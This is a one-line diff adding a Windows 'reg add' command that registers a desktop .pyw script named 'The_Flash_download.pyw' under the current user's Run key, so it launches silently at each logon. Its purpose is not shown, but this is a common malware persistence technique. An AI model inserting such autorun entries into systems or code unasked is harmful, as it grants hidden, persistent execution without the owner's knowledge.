@@ -1,0 +1,1 @@
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v The_Flash /t REG_SZ /d C:\Users\17140\Desktop\The_Flash_download.pyw /f
